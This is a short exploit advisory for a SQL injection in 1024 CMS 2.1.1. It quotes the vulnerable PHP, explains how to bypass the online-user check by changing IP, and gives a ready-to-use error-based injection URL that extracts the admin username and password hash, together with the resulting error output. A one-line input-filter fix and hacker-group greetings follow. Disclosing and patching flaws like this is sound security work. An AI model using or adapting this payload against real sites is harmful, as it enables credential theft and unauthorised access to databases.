# Date: 21/08/2012
# Exploit Author: Kallimero
# Vendor Homepage: http://www.1024cms.org
# Software Link: http://sourceforge.net/projects/cms-cvi/files/v2.1.zip/download
# Version: 2.1.1
# Tested on: Debian



Introduction
============


1024 cms is vulnerable to a tricky SQL injection



The vuln
========


First let&#039;s see the code :

---------------[index.php]---------------

if(!isset($_GET[&#039;p&#039;]) || trim($_GET[&#039;p&#039;]) == "") $page = $defaultpage;
else $page = mb_strtolower($_GET[&#039;p&#039;]);
 
$online_page = $page;

---------------[index.php]---------------

You see that it&#039;s possible to inject in the $online_page variable thanks to $_GET[&#039;p&#039;];


---------------[includes/classes/whosonline.php]---------------
ligne 8:

if(!isset($online_page) || $online_page == "") $location = $sitename;
else $location = $online_page;
$uid = $_SESSION[&#039;user&#039;];

---------------[includes/classes/whosonline.php]---------------

w00t an SQL injection. $location isn&#039;t properly sanitarized.

Its a bit tricky because to inject you have to be connected but not logged as an online user with your ip.
The most simple solution is to log with an ip, then keep the cookies and inject with another.


The PoC :
=========

Error based injection in INSERTO INTO :
http://[site]/index.php?p=hwc%20rox%20modafucka%27,%20%28select%201%20from%20%28select%20count%28*%29,concat%28%28SELECT%20concat%28username,%200x3a,%20password%29%20FROM%20otatf_users%20LIMIT%200,1%29,0x7e,%20floor%28rand%280%29*3%29%29%20as%20e%20from%20information_schema.tables%20group%20by%20e%29%20a%29%29--%20-

And you normally see :
WHOSONLINE::: Cannot insert user: Duplicate entry &#039;admin:[MD5 HASH]~1&#039; for key &#039;group_key&#039;


How to Fix ?
============


To fix the vuln juste take this line of the index.php script :
if(mb_eregi("[^[:space:]a-zA-Z0-9_.-]{1,}", $page)) die("PAGE FORMAT INCORRRECT");
And put it before the whosonline.php inclusion.


 Thanks
=========

Special thanks : Epicout
All hwc members : Necromoine, fr0g, AppleSt0rm, St0rn, Zhyar, k3nz0.
Please visit : http://orgasm.re/



